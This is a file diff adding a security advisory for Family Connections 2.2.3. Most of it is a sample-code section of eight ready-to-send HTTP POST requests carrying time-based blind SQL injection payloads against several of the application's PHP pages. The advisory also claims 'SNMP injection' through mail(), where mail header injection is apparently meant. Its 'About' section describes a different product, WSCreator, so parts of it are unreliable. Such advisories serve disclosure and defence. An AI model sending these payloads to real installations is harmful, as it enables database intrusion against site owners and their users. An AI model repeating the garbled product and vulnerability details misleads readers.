@@ -1,0 +1,137 @@
+Family Connections 2.2.3 Multiple Remote Vulnerabilities
+
+ Name              Family Connections
+ Vendor            http://www.familycms.com
+ Versions Affected 2.2.3
+
+ Author            Salvatore Fresta aka Drosophila
+ Website           http://www.salvatorefresta.net
+ Contact           salvatorefresta [at] gmail [dot] com
+ Date              2010-10-05
+
+X. INDEX
+
+ I.    ABOUT THE APPLICATION
+ II.   DESCRIPTION
+ III.  ANALYSIS
+ IV.   SAMPLE CODE
+ V.    FIX
+ 
+
+I. ABOUT THE APPLICATION
+
+Based on one of the world's leading structure  and content 
+management systems - WebSiteAdmin, WSCreator  (WS standing
+for WebSite) is powerful application for handling multiple
+websites.
+
+
+II. DESCRIPTION
+
+Many fields are not properly sanitised.
+
+
+III. ANALYSIS
+
+Summary:
+
+ A) Multiple Blind SQL Injection
+ B) Multiple SNMP Injection
+ 
+
+A) Multiple Blind SQL Injection
+
+All numeric  fields  that I tested are vulnerable to Blind
+SQL Injection.
+These  bugs  exist  because of the use of the unquotes SQL 
+fields (numeric fileds only) which  are not properly sani-
+tised.
+
+
+B) Multiple SNMP Injection
+
+The parameters passed to the mail() PHP function  are  not
+properly sanitised. This  allows  to inject arbitrary SNMP
+headers.
+
+
+IV. SAMPLE CODE
+
+A) Multiple Blind SQL Injection
+
+POST /path/recipes.php HTTP/1.1
+Host: targethost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 73
+Cookie: PHPSESSID=50e78936f22e0ffb7c5df13011fa2dfd
+
+delconfirm=1&id=-1 OR IF(ASCII(0x41) = 65,BENCHMARK(999999999,NULL),NULL)
+
+
+POST /path/gallery/upload.php HTTP/1.1
+Host: targethost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 70
+Cookie: PHPSESSID=50e78936f22e0ffb7c5df13011fa2dfd
+
+category=(SELECT(IF(ASCII(0x41) = 65,BENCHMARK(999999999,NULL),NULL)))
+
+
+POST /path/addressbook.php HTTP/1.1
+Host: targethost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 74
+Cookie: PHPSESSID=50e78936f22e0ffb7c5df13011fa2dfd
+
+editsubmit=1&aid=-1 OR IF(ASCII(0x41) = 65,BENCHMARK(999999999,NULL),NULL)
+
+
+POST /path/addressbook.php HTTP/1.1
+Host: targethost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 74
+Cookie: PHPSESSID=50e78936f22e0ffb7c5df13011fa2dfd
+
+editsubmit=1&uid=-1 OR IF(ASCII(0x41) = 65,BENCHMARK(999999999,NULL),NULL)
+
+
+POST /path/calendar.php HTTP/1.1
+Host: targethost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 67
+Cookie: PHPSESSID=50e78936f22e0ffb7c5df13011fa2dfd
+
+edit=1&id=-1 OR IF(ASCII(0x41) = 65,BENCHMARK(999999999,NULL),NULL)
+
+
+POST /path/calendar.php HTTP/1.1
+Host: targethost
+Content-Type: application/x-www-form-urlencoded
+Content-Length:73
+Cookie: PHPSESSID=50e78936f22e0ffb7c5df13011fa2dfd
+
+delconfirm=1&id=-1 OR IF(ASCII(0x41) = 65,BENCHMARK(999999999,NULL),NULL)
+
+
+POST /path/familynews.php HTTP/1.1
+Host: targethost
+Content-Type: application/x-www-form-urlencoded
+Content-Length:73
+Cookie: PHPSESSID=50e78936f22e0ffb7c5df13011fa2dfd
+
+submitedit=1&id=-1 OR IF(ASCII(0x41) = 65,BENCHMARK(999999999,NULL),NULL)
+
+
+POST /path/familynews.php HTTP/1.1
+Host: targethost
+Content-Type: application/x-www-form-urlencoded
+Content-Length:73
+Cookie: PHPSESSID=50e78936f22e0ffb7c5df13011fa2dfd
+
+delconfirm=1&id=-1 OR IF(ASCII(0x41) = 65,BENCHMARK(999999999,NULL),NULL)
+
+
+V. FIX
+
+No Fix.
+
